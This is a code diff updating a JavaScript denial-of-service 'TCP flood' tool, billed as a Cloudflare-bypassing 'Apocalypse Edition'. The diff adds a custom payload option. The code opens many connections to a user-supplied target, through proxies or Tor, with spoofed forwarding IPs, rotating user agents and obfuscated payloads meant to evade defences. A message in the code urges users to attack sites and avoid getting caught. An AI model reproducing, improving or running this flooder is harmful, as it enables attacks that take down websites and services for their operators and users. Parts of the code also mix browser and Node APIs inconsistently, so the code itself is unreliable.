@@ -5,7 +5,7 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// * DDoS TOOL - TCP FLOOD - v9.0 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
+// * DDoS TOOL - TCP FLOOD - v9.5 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
 // ******************************************************************************
 
 // Import required modules at the top
@@ -18,6 +18,7 @@ const url = require('url');
 const dns = require('dns').promises;
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const fs = require('fs'); // File system module for logging
+const { fetch } = require('cross-fetch'); // Cross-browser fetch
 
 // Configuration - Let's fuck things up HARD!
 let targetURL = prompt(`${purple}Enter target URL (including http/https/onion):${resetColor}`);
@@ -41,6 +42,7 @@ let proxyListURL = prompt(`${purple}Enter URL for proxy list (HTTP/SOCKS4/SOCKS5
 let useRandomSubdomains = confirm(`${darkPurple}Use random subdomains? (Helps bypass some DDoS protection. Smart, huh?)${resetColor}`);
 let advancedObfuscation = confirm(`${darkPurple}Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down. Your call.)${resetColor}`);
 let autoAdjustThreads = confirm(`${darkPurple}Automatically adjust threads based on connection health? (experimental, might make things worse. What the hell, let's try.)${resetColor}`);
+let customPayload = prompt(`${purple}Enter custom payload (or leave blank for default GET request):${resetColor}`);
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -219,7 +221,7 @@ function obfuscatePayload(payload) {
 
 // Modified TCP Flood function with .onion and Cloudflare support
 async function tcpFlood(threadId) {
-    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${advancedObfuscation ? ' (with advanced payload obfuscation)' : ''}${resetColor}`);
+    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${onionSupport ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${advancedObfuscation ? ' (with advanced payload obfuscation)' : ''}${resetColor}`);
 
     activeThreads++; // Increment active threads counter
 
@@ -265,16 +267,14 @@ async function tcpFlood(threadId) {
                             return;
                         }
 
-                        // Basic proxy format: [protocol://][username:password@]host:port
                         const proxyURL = new URL(proxyString);
                         const proxyHost = proxyURL.hostname;
                         const proxyPort = parseInt(proxyURL.port);
-                        const proxyProtocol = proxyURL.protocol.slice(0, -1); // Remove ':'
+                        const proxyProtocol = proxyURL.protocol.slice(0, -1);
                         const proxyAuth = proxyURL.username && proxyURL.password ? `${proxyURL.username}:${proxyURL.password}@` : '';
 
                         const parsedTargetURL = url.parse(targetURL.href);
 
-                        // Proxy agent options
                         const agentOptions = {
                             host: proxyHost,
                             port: proxyPort,
@@ -283,10 +283,8 @@ async function tcpFlood(threadId) {
                             auth: proxyAuth ? `${proxyURL.username}:${proxyURL.password}` : undefined,
                         };
 
-                        // Set proxy agent
                         const proxyAgent = new HttpsProxyAgent(agentOptions);
 
-                        // HTTP options
                         const options = {
                             hostname: targetHost,
                             port: port,
@@ -312,14 +310,13 @@ async function tcpFlood(threadId) {
                         const req = https.request(options, (res) => {
                             log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} via proxy ${proxyHost}:${proxyPort} - Status: ${res.statusCode}${resetColor}`);
                             res.on('data', () => {
-                            }); // Consume data
+                            });
                             res.on('end', () => {
-                            }); // End data
+                            });
                         });
 
                         req.on('socket', (sock) => {
-                            // Set up socket timeout and error handling
-                            sock.setTimeout(15000); // Adjust as needed
+                            sock.setTimeout(15000);
                             sock.on('timeout', () => {
                                 log(`${darkRed}[THREAD ${threadId}] Socket timeout`);
                                 req.abort();
@@ -336,18 +333,16 @@ async function tcpFlood(threadId) {
 
                     } else {
                         if (isHTTPS) {
-                            // TLS/SSL connection
                             const tlsOptions = {
                                 host: targetHost,
                                 port: port,
-                                rejectUnauthorized: false, // Allow self-signed certificates (for testing)
+                                rejectUnauthorized: false,
                             };
                             socket = tls.connect(port, targetHost, tlsOptions, () => {
                                 log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (TLS)${resetColor}`);
                                 resolve(socket);
                             });
                         } else {
-                            // Regular TCP connection
                             socket = net.createConnection({host: targetHost, port: port}, () => {
                                 log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
                                 resolve(socket);
@@ -365,7 +360,7 @@ async function tcpFlood(threadId) {
             socket = await connect();
 
             let intervalId = setInterval(() => {
-                let payload = "GET / HTTP/1.1\r\n";
+                let payload = customPayload ? customPayload + "\r\n" : "GET / HTTP/1.1\r\n";
                 let hostname = targetHost;
 
                 if (useRandomSubdomains) {
@@ -378,7 +373,6 @@ async function tcpFlood(threadId) {
                 payload += "Cache-Control: max-age=0\r\n";
                 payload += "Upgrade-Insecure-Requests: 1\r\n";
 
-                // Cloudflare Bypass - Add some extra headers to trick their shit
                 if (cloudflareBypass) {
                     payload += "X-Forwarded-For: " + generateRandomIP() + "\r\n";
                     payload += "X-Real-IP: " + generateRandomIP() + "\r\n";
@@ -387,15 +381,14 @@ async function tcpFlood(threadId) {
 
                 payload += "User-Agent: " + getRandomUserAgent() + "\r\n";
                 payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
-                payload += "Accept-Encoding: gzip, deflate, br\r\n"; // Add brotli encoding
+                payload += "Accept-Encoding: gzip, deflate, br\r\n";
                 payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
                 payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n";
 
-                // Advanced Payload Obfuscation
                 if (advancedObfuscation) {
                     const obfuscationResult = obfuscatePayload(payload);
                     payload = obfuscationResult.encrypted;
-                    payload += "\r\nX-Obfuscation-Key: " + obfuscationResult.key + "\r\n"; // Append obfuscation key
+                    payload += "\r\nX-Obfuscation-Key: " + obfuscationResult.key + "\r\n";
                 }
 
                 try {
@@ -410,12 +403,12 @@ async function tcpFlood(threadId) {
             socket.on('error', (err) => {
                 log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
                 socket.destroy();
-                clearInterval(intervalId); // Clear interval on socket error
+                clearInterval(intervalId);
             });
 
             socket.on('close', () => {
                 log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
-                clearInterval(intervalId); // Clear interval on socket close
+                clearInterval(intervalId);
             });
 
         } catch (connectError) {
@@ -424,15 +417,14 @@ async function tcpFlood(threadId) {
                 socket.destroy();
             }
         } finally {
-            // Decrement duration even if there was an error
             duration--;
             if (duration <= 0) {
-                isRunning = false; // Stop the attack
+                isRunning = false;
             }
         }
     }
 
-    activeThreads--; // Decrement active threads counter
+    activeThreads--;
     log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
 }
 
@@ -454,9 +446,9 @@ function getRandomUserAgent() {
         'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
         'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
         'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203', // Added a valid Edge User-Agent
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/101.0.4843.33', // Added a valid Opera User-Agent
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko', // Added a valid IE 11 User-Agent
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/101.0.4843.33',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
     ];
     return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
@@ -526,12 +518,10 @@ function adjustThreads() {
         tcpFlood(newThreadId);
         log(`${yellow}[MAIN] Increasing threads to improve performance. Current threads: ${activeThreads}${resetColor}`);
     } else if (healthyThreads > threads * 0.8 && activeThreads > threads / 2) {
-        // Reduce threads to conserve resources if the connection is too stable
-        isRunning = false; // This will stop a thread if it's active
+        isRunning = false;
         log(`${yellow}[MAIN] Reducing threads to conserve resources. Current threads: ${activeThreads}${resetColor}`);
     }
 
-    // Clear thread health data
     threadHealth = [];
 }
 
@@ -571,7 +561,6 @@ async function main() {
     startTime = Date.now();
     timerInterval = setInterval(updateTimer, 1000);
 
-    // Adjust threads every 10 seconds
     setInterval(adjustThreads, 10000);
 
     for (let i = 0; i < threads; i++) {
@@ -598,7 +587,6 @@ stopButton.addEventListener('click', () => {
 console.log(`%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass! We've also added some Cloudflare bypass techniques - don't expect miracles.`, "color: darkblue;");
 
 // Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
-// This would typically be set server-side, but for demonstration:
 try {
     document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; connect-src 'self';">`);
     document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="X-Content-Type-Options" content="nosniff">`);
